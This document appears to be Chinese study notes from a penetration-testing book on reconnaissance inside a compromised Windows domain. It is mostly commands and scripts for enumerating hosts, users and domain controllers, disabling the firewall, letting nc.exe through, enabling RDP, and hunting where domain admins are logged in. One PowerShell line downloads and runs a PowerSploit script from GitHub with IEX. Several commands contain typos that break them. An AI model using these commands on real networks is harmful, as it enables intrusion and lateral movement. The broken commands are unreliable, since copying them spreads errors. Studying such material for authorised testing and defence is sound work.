# 2.内网信息收集
## 2.2 收集本机信息
### 2.2.1 手动收集信息
+ 查询网络配置信息
`ipconfig /all`
+ 查询操作系统和版本信息
`systeminfo`
+ 查看系统体系结构
`echo %PROCESSOR_ARCHITECTURE%`
+ 查看安装的软件及版本和路径
`wmic product get name,version`
`powershell "Get-wmiobject -class win32_product | select-object -property name,version"`
+ 查询本机服务信息
`wmic service list brief`
+ 查询进程列表
`tasklist`
`wmic process list brief`
+ 查看启动程序信息
`wmic startup get command,caption`
+ 查看计划任务
`schtasks /query /fo LIST /v`
+ 查看主机开机时间
`net statistics workstation`
+ 查询用户列表
`net user`
+ 查询用户组
`net localgroup 组名`
+ 查询当前在线用户
`query user || qwinsta`
+ 列出或断开本地计算机与所链接的客户端之间的会话
`net session`
+ 查询端口列表
`netstat -ano`
+ 查看补丁列表
`systeminfo`
`wmic qfe get caption,description,hotfixid,installedon`
+ 查询本机共享列表
`net share`
`wmic share get name,path,status`
+ 查询路由表
`route print`
+ 查询arp缓存
`arp -a`
+ 防火墙相关
```cmd
//关闭防火墙
netsh firewall set opmode disable	//win2003及以前
netsh advfirewall set allprofiles state off		//win2003以后
//查看防火墙配置
netsh firewall show config
//修改防火墙配置
	//win2003及以前的版本
netsh firewall add allowedprogram c:\nc.exe "allow nc" enble
	//win2003以后
		//允许指定程序进入
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"
		//允许制定程序退出
netsh advfirewall firewall add rule name="pass nc" dir=out action=allow program="C:\nc.exe"
		//允许3389端口放行
netsh advfirewall firewall add rule name="remote desktop" protocol=TCP dir=in localport=3389 action=allow
//自定义防火墙日志的存储位置
netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"
```
+ 查看代理配置情况
`reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet settings"`
+ 查询并开启远程连接服务
```cmd
//查看远程连接端口
 reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v portnumber
//在windows2003中开启3389端口
wmic path win32_terminalservicesetting where (_CLASS ! ="") call
setallowtsconnections 1
//windwos server 2008-2012开启3389端口
1)
wmic /namespace:\\root\cimv2\terminalservices path
win32_terminalservicesetting where (_CLASS !="") call setallowtscoonections 1
2)
wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting 
where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1
3)
red add "HKLM\SYSTEMCURRENT\CONTROL\TERMINAL SERVER" /v 
fSingleSessionPerUser /t REG_DWORD /f 0 /f
```
### 2.2.2 自动手机信息
+ wmic(44页)
### 2.2.3 Empire下的主机信息收集
//本机用户,域组成员,密码设置时间,剪贴板信息,系统基本信息,网络适配器信息,共享信息等
`usemodule situational_awareness/host/winenum`
//几乎所有系统中游泳的信息
`usemodule situational_awareness/host/computerdetails`
## 2.3 查询当前权限 
+ 查看当前权限
`whoami`
+ 获取域SID
`whoami /all`
+ 查询指定用户的详细信息
`net user xxx /domain`
## 2.4 判断是否存在域
+ ipconfig
`ipconfig /all`
+ 查看系统详细信息
`systeminfo`
+ 查询当前登录域及登录用户信息
`net config workstation`
+ 判断主域
`net time /domain`
## 2.5 探测内网存活主机
### 2.5.1 使用NetBios快速探测内网
+ nbtscan
`nbtscan.exe 192.168.0.1/24`
### 2.5.2 使用ICMP协议快速探测内网
+ bat批处理
`for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="`
+ vbs(51页)
### 2.5.3 通过ARP扫描探测内网
+ arp-scan工具
`arp.txt -t 192.168.1.1/24`
+ Empire中的arpscan模块
`usemodules situational_awareness/network/arpscan`
+ Nishang中的Invoke-ARPScan.ps1脚本
`powershell.exe -exec bypass -Command "& {import-module C:\windows\temp\invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.1/24}" >> C:\windows\temp\log.txt`
### 2.5.4 通过常规TCP/UDP端口扫描探测内网
+ ScanLine
`scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O C:\windows\temp\log.txt -p 192.168.1.1-254 /b`
## 2.6 扫描域内端口
+ 利用telnet扫描
`telnet DC 22`
+ S扫描器
> windows2003及以下
`s.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099 256 /Banner /save`
+ metasploit端口扫描
`search portscan`
+ powersploit的Invoke-portscan.ps1
`powershell.exe -nop -exec bypass -c "IEX (New-Object Net-WebClient).DOwnloadString('https://raw.githunbusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -ports '445,1433,8080,3389,80' -oA C:\windows\temp\res.txt"`
+ Nishang的Invoke-PortScan模块
`Get-Help Invoke-portscan -full`
|参数 |说明 |
|----|----|
|StartAddress |扫描范围的开始地址|
|EndAddress |扫描范围的结束地址|
|ScanPort |进行端口扫描|
|Port |指定端口扫描|
>默认扫描的端口有:21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901
扫描存活主机并解析主机名
`Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolvHost`
### 2.6.6 端口Banner信息(57页)
## 2.7 收集域内信息
### 查询域
` net view /domain`
### 查询域内所有计算机
`net view /domain:域名`
### 查询域内所有用户组列表
`net group /domain`
> 系统自带的常见用户身份
+ Domain Admins : 域管理员
+ Domain Computers : 域内机器
+ Domain Controllers : 域控制器
+ Domain Guest : 域访客,权限较低
+ Domain Users : 域用户
+ Enterprise Admin : 企业系统管理员用户
> 默认情况下,Domain Admin和Enterprise Admin对域内所有域控制器有完全的控制权限
### 查询所有域成员计算机列表
`net group "domain computers" /domain`
### 获取域密码信息
`net accounts /domain`
### 获取域信任信息
`nltest /domain_trusts`
## 2.8查找域控制器
### 查看域控制器机器名
`nltest /DCLIST:域名`
### 查看域控制器的主机名
`Nslookup -type=SRV _ldap._tcp`
### 查看当前时间
`net time /domain`
### 查看与控制器组
`net group "domain controllers" /domain`
### 查看域控制器机器名
`netdom query pdc`
## 2.9获取域内的用户和管理员信息
### 查询所有域用户列表
+ 向域控制器进行查询
`net user /domain`
+ 获取域内用户详细信息
`wmic useraccount get /all`
+ 查看存在的用户
`dsquery user`
+ 查询本地管理员组用户
`net localgroup administrators`
### 查询域管理员用户组
+ 查询域管理员用户
`net group "domain admins" /domain`
+ 查询域管理员用户组
`net group "Enterprise Admins" /domain`
## 2.10定位域管理员
### 常用与管理员定位工具
#### psloggedon.exe
`psloggedon [-] [-l] [-x] [\\cpmputername|username]`
|参数|说明|
|----|----|
|- |显示支持的选项和用于输出值的单位|
|-l |进显示本地登录,不显示本地和网络资源登录|
|-x | 不显示登录时间|
|\\computername |指定要列出登录信息的计算机名称|
|\\username |指定用户名,在网络中搜索该用户登录的计算机|
#### PVEFindADUser.exe
`PVEFindADUser <参数>`
直接运行 `pveadfinduser.exe -current`命令,即可显示域中所有计算机(计算机,服务器,域控制器)上当前登录的所有用户,查询结果将被输出到report.csv文件中
|参数|说明|备注|
|----|----|----|
|-h | 显示帮助信息||
|-u |检查程序是否有新版本||
|-current |获取目标计算机上当前登录的所有用户||
|-current Domain\Username |显示该用户登录的计算机||
|-last |获取目标计算机的最后一个登录用户|根据网络的安全策略,可能会隐藏最后一个登录用户的用户名,此时此工具可能无法得到该用户名|
|-last domain\username |显示此用户上次登录的计算机|根据网络的安全策略,可能会隐藏最后一个登录用户的用户名,此时此工具可能无法得到该用户名|
|-noping |阻止该工具在尝试获取用户登录信息之前对目标计算机执行ping命令|
|-target |可选参数,用于指定要查询的主机,如果未指定此参数,将查询当前域中的所有主机,如果指定此参数,则后跟一个由逗号分隔的主机名列表||
#### netview.exe
`netview.exe <参数>`
|参数|说明|
|----|----|
|-h |显示帮助信息|
|-f filename.txt |指定要提取主机列表的文件|
|-e filename.txt |指定要排除的主机名的文件|
|-o filename.txt |将所有输出重定向到指定文件|
|-d domain |指定要提取主机列表的域,如果没有指定,则从当前域中提取主机列表|
|-g group |指定搜索的组名,如果没有指定,则在domain admins组中搜索|
|-c |对已找到的共享目录/文件的访问权限进行检查|
#### Nmap的NSE脚本
|脚本|说明|
|----|----|
|smb-enum-domains.nse |对域控制器进行信息收集,可以获取主机信息,用户,可使用的密码策略的用户等|
|smb-enum-users.nse |如果获得了域内某台主机的权限,但是权限有限,无法获取更多域用户信息,就可以借助这个脚本对域控制器进行扫描|
|smb-enum-share.nse |遍历远程主机的共享目录|
|smb-eunm-processes.nse |对主机的系统进行遍历,通过这些信息可以知道目标主机上正在运行哪些软件|
|smb-enum-sessions.nse |获取域内主机的用户登录会话,查看当前是否有用户登录|
|smb-os-discovery.nse |收集目标主机的操作系统,计算机名,域名,域林名称,netbios机器名,工作组,系统时间等信息|
#### PowerView脚本
+ powerview默认使用invoke-stealthuserhunte,如果找不到需要的信息,就使用invoke-userhunter
```powershell
powershell.exe -exec bypass -Command "& {import-module c:\powerview.ps1; invoke-userhunter}"
```
|脚本|说明|
|----|----|
|invoke-stealthuserhunter |只需要进行一次查询,就可以获取域里的所有用户.使用方法为,从user.homedirectorie中提取所有用户,并对每台服务器进行get-netsessions获取,因为不需要使用invoke-userhunter对每台机器进行操作,所以这个方法的隐蔽性相对较高(但涉及的机器不一定全面)|
|invoke-userhunter |找到域内特定的用户群,接收用户名,用户列表和域组查询,接收一个主机列表或查询可用的主机域名,它可以使用get-netsessions和get-netloggedon(点用netsessionenum和netwkstauserenumAPI)扫描每台服务器并对扫描结果进行比较,从而找出目标用户集,在使用时不需要管理员权限|
#### Empire的user_hunter模块
`usemodule situational_awareness/network/powerview/user_hunter`
### 2.11查找域管理进程
#### 本机检查
+ 获取域管理员列表
`net group "domain admins" /domain`
+ 列出本机的所有进程及进程用户,寻找进程所有者为域管理员的进程
`tasklist /v`
#### 查询域控制器的域用户会话
+ 查询域控制器列表
`net group "domain controllers" /domain`
+ 收集域管理员列表
> 可使用LDAP进行查询,也可以用net命令查询(下面没有ldap查询的例子)
`net group "domain admins" /domain`
+ 收集所有活动域的绘画列表
`netsess -h`
+ 交叉引用域管理员列表与活动会话列表
//将域控制器列表添加到dcs.txt
//将域管理员列表添加到admins.txt
//与netseee.exe同目录,会在当前目录下生成sessions.txt
```bat
FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>NUL > sessions.txt && FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a
```
> 网上也有类似的脚本:Get Domain Admins(GDA)批处理脚本
+ 查询远程系统中运行的任务
> 如果目标机器在域系统中是通过共享的本地管理员帐号运行的,可以使用下列脚本产寻系统中的域管理任务
// 从domain admins组中手机域管理员列表
`net group "domain admins" /domain`
//运行如下脚本,将目标域系统列表添加到ips.txt,将收集到的域管理员列表添加到names.txt
```bat
FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt && FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause
```
+ 扫描远程系统的NetBios信息
某些版本的windows操作系统允许用户通过netbios查询已登录用户
//域管理员列表添加到admins.txt
//目标域系统列表添加到ips.txt
> 下面这个命令行脚本就用于扫描远程系统活跃域中的管理会话
```cmd
FOR /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL > nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
```
> 也可以使用nbtscan工具
//nbtscan放于同目录
```bat
FOR /F %i in (ips.txt) do @echo [+] Checking %i && nbtscan -f %i 2>NUL > nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
```
### 2.12域管理员模拟方法简介
如果已经拥有一个meterpreter会话,就可以使用incognito来模拟域管理员或者添加一个域管理员,通过尝试遍历系统中所有可用的授权令牌来添加新的管理员,具体操作方法在第4章讲解
### 2.13 利用powershell收集域信息
+ powerview.ps1 
```
import-module .\powerview.ps1
```
|常用命令|说明|
|----|----|
|Get-NetDomain |获取当前用户所在域的名称|
|Get-NetUser |获取所有用户的详细信息|
|Get-NetDomainController |获取所有域控制器的信息|
|Get-NetComputer |获取域内所有计算机的详细信息|
|Get-NetOU |获取域中OU信息|
|Get-NetGroup |获取所有域内组和组成员信息|
|Get-NetFileServer |根据SPN获取当前域使用的文件服务器信息|
|Get-NetShare |获取当前域内所有的网络共享信息|
|Get-NetSession |获取指定服务器的会话|
|Get-NetRDPSession |获取指定服务器的远程连接|
|Get-NetProcess |获取远程主机的进程|
|Get-UserEvent |获取指定用户的日志|
|Get-ADObject |获取活动目录的对象|
|Get-NetGPO |获取域内所有的组策略对象|
|Get-DomainPolicy |获取域默认策略或者域控制器策略|
|Invoke-UserHunter |获取域用户登录的计算机信息及该用户是否有本地管理员权限|
|Invoke-ProcessHunter |通过查询域内所有的机器进程找到特定用户|
|Invoke-UserEventHunter |根据用户日志查询某域用户登录过哪些机器|
### 2.13域分析工具BloodHound
+ 配置环境(76页)
+ 采集数据(80页)
+ 导入数据(81页)
+ 查询信息(82页)
	1):查询所有域管理员
	2):查找到达域管理员的最短路径
	3):查看特定用户与域关联的详细信息
	4):查看指定计算机与域的关系
	5):寻找路径
### 2.15敏感数据的防护(87页)







